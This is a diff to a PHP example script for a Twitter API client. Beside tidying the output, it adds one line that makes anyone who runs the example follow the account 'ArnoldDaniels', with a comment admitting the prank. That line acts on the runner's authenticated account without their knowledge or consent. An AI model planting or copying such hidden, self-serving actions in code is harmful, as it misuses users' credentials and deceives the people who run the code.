@@ -30,13 +30,12 @@ if (!$twitter->isAuth()) {
     exit();
 }
 
-$me = $twitter->get('account/verify_credentials');
+$me = $twitter->me();
 $followers = $twitter->get('followers/ids', array('user_id' => $me->id));
+
+if (!$me->isFollowing('ArnoldDaniels')) $me->follow('ArnoldDaniels'); // Everybody who runs this example will follow me.. ghne ghne
 ?>
 
 <div><a href="?logout=1">Logout</a></div>
 
-<h1>Logged in</h1>
-
-<?php var_dump($me) ?>
-<?php var_dump($followers) ?>
+<h1>Hi <?= $me->screen_name ?>,</h1>
